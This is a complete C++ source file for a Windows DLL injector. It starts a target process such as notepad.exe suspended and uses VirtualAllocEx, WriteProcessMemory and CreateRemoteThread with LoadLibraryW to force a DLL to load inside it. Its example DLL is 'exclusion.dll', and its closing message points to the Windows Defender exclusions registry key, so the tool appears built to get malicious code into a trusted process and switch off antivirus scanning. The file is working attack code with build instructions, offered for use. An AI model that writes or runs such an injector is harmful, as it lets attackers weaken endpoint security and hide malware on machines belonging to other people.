#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

// DLL Injector - spawns a target process then injects DLL into it
// Requires: Admin privileges
// Usage: injector.exe <exe_path> <dll_path>
// Example: injector.exe C:\Windows\System32\notepad.exe C:\projects\exclusion.dll

bool InjectDLL(DWORD pid, const wchar_t* dllPath) {
    size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);

    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        FALSE, pid
    );
    if (!hProcess) {
        std::wcerr << L"[!] OpenProcess failed. Error: " << GetLastError() << std::endl;
        return false;
    }
    std::wcout << L"[+] Opened process PID: " << pid << std::endl;

    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuffer) {
        std::wcerr << L"[!] VirtualAllocEx failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    std::wcout << L"[+] Allocated memory in target process" << std::endl;

    if (!WriteProcessMemory(hProcess, remoteBuffer, dllPath, pathSize, NULL)) {
        std::wcerr << L"[!] WriteProcessMemory failed. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::wcout << L"[+] Wrote DLL path to target process memory" << std::endl;

    LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!loadLibAddr) {
        std::wcerr << L"[!] GetProcAddress failed. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::wcout << L"[+] Found LoadLibraryW at: " << loadLibAddr << std::endl;

    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibAddr,
        remoteBuffer, 0, NULL
    );
    if (!hThread) {
        std::wcerr << L"[!] CreateRemoteThread failed. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    std::wcout << L"[+] Remote thread created, waiting for DLL to load..." << std::endl;
    WaitForSingleObject(hThread, 5000);

    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    std::wcout << L"[+] Thread exit code (DLL handle): " << exitCode << std::endl;

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    if (exitCode == 0) {
        std::wcerr << L"[!] DLL load failed in target process" << std::endl;
        return false;
    }

    std::wcout << L"[+] DLL injected successfully!" << std::endl;
    return true;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 3) {
        std::wcout << L"Usage: injector.exe <target_exe> <dll_path>" << std::endl;
        std::wcout << L"Example: injector.exe C:\\Windows\\System32\\notepad.exe C:\\projects\\exclusion.dll" << std::endl;
        return 1;
    }

    const wchar_t* targetExe = argv[1];
    const wchar_t* dllPath   = argv[2];

    std::wcout << L"[*] Spawning process: " << targetExe << std::endl;
    std::wcout << L"[*] DLL path: " << dllPath << std::endl;

    // Spawn the target process suspended
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessW(targetExe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::wcerr << L"[!] CreateProcess failed. Error: " << GetLastError() << std::endl;
        return 1;
    }

    std::wcout << L"[+] Spawned suspended PID: " << pi.dwProcessId << std::endl;

    // Inject while suspended — guaranteed same privilege level
    bool ok = InjectDLL(pi.dwProcessId, dllPath);

    // Resume the process
    ResumeThread(pi.hThread);
    std::wcout << L"[+] Process resumed" << std::endl;

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    if (!ok) {
        std::wcerr << L"[!] Injection failed" << std::endl;
        return 1;
    }

    std::wcout << L"[+] Done - check regedit: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" << std::endl;
    return 0;
}

// Compile:
//   cl injector.cpp /Fe:injector.exe /EHsc /nologo
